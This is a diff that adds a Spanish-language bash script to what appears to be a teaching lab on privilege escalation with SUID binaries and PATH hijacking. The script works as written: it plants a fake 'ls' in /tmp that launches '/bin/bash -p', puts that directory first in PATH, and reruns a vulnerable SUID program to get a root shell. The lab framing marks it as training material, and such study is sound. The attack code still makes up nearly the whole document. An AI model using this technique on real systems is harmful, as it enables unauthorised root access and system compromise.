@@ -293,3 +293,65 @@ echo "--- Configuración del laboratorio SUID vulnerable completada. ---"
 echo "Ahora, ejecuta './01_exploit.sh' como tu usuario normal para intentar la escalada."
 
 ```
+#### lab1_suid_path/01_exploit.sh
+
+```bash
+#!/bin/bash
+# 01_exploit.sh - Script para ejecutar la explotación de SUID+PATH
+# Este script DEBE ejecutarse como un usuario NO-ROOT.
+
+echo "--- Iniciando intento de explotación SUID+PATH ---"
+
+# --- Paso 1: Verificar el usuario actual ---
+echo "[1/4] Verificando usuario actual..."
+CURRENT_USER=$(whoami)
+echo "    Actualmente logueado como: $CURRENT_USER"
+if [ "$CURRENT_USER" == "root" ]; then
+    echo "ADVERTENCIA: Estás como root. Este script debe ser ejecutado por un usuario no-root."
+    echo "Por favor, sal de la sesión de root y ejecuta como un usuario normal."
+    exit 1
+fi
+
+# --- Paso 2: Ejecutar el programa vulnerable sin PATH modificado (primera prueba) ---
+VULN_BIN="/opt/vulnerable_app_suid/vulnerable_program"
+echo "[2/4] Ejecutando el programa vulnerable sin PATH modificado..."
+"$VULN_BIN"
+echo "    Observa la salida anterior. El 'ls' probablemente falló o no mostró /root."
+
+# --- Paso 3: Preparar el PATH malicioso ---
+MALICIOUS_DIR="/tmp/pwned_path_suid"
+MALICIOUS_LS="$MALICIOUS_DIR/ls"
+echo "[3/4] Creando directorio malicioso y falso 'ls' en $MALICIOUS_DIR"
+mkdir -p "$MALICIOUS_DIR"
+if [ $? -ne 0 ]; then
+    echo "ERROR: No se pudo crear el directorio malicioso. ¿Permisos?"
+    exit 1
+fi
+
+# El 'ls' falso que nos dará una shell de root
+tee "$MALICIOUS_LS" > /dev/null <<EOF
+#!/bin/bash
+echo "[ATAQUE]: ¡Tu 'ls' malicioso ha sido ejecutado como Root!"
+/bin/bash -p # La clave: Obtener una shell con los privilegios del proceso padre (root)
+EOF
+chmod +x "$MALICIOUS_LS"
+echo "    Falso 'ls' creado y ejecutable."
+
+echo "    Manipulando la variable PATH..."
+export PATH="$MALICIOUS_DIR:$PATH"
+echo "    PATH actual (verás $MALICIOUS_DIR al principio): $PATH"
+
+# --- Paso 4: Ejecutar el programa vulnerable DE NUEVO con el PATH modificado ---
+echo "[4/4] Ejecutando el programa vulnerable de nuevo. ¡Prepara la shell de Root!"
+echo "    Si todo va bien, deberías ver una nueva shell con 'root@...' y un prompt diferente."
+echo "    Usa 'id' para verificar tus privilegios."
+echo "    Para salir de la shell de root, escribe 'exit'."
+echo ""
+
+"$VULN_BIN"
+
+# Después de salir de la shell de root, este script continúa
+echo "--- Explotación SUID+PATH finalizada. ---"
+echo "Si obtuviste la shell de root y la verificaste con 'id', ¡felicidades!"
+echo "Ahora, ejecuta './03_revert_fix.sh' con 'sudo' para limpiar el laboratorio."
+```
